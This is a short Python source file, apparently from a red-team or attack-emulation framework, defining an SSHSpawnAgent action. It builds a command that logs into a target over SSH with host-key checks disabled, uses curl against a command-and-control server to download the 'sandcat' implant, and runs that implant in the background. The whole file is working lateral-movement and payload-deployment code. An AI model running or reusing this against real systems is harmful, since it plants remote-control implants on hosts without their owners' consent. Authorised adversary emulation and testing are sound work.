from ..low_level_action import LowLevelAction
from incalmo.models.agent import Agent
from incalmo.core.services.config_service import ConfigService


class SSHSpawnAgent(LowLevelAction):
    def __init__(self, agent: Agent, ssh_ip: str, ssh_user: str, ssh_port: str):
        self.ssh_ip = ssh_ip
        self.ssh_user = ssh_user
        self.ssh_port = ssh_port
        server = ConfigService().get_config().agent_c2c_server
        remote_cmd = (
            f'agent=$(curl -svkOJ -X POST -H "file:sandcat.go" -H "platform:linux" {server}/file/download '
            f'2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d= -f2 | tr -d "\\"\\r") '
            f"&& chmod +x $agent 2>/dev/null; "
            f"nohup ./$agent -server {server} -group red >/dev/null 2>&1 &"
        )
        command = (
            f"ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
            f"-o ConnectTimeout=3 -p {ssh_port} {ssh_user}@{ssh_ip} '{remote_cmd}'"
        )
        super().__init__(agent, command, command_delay=3)
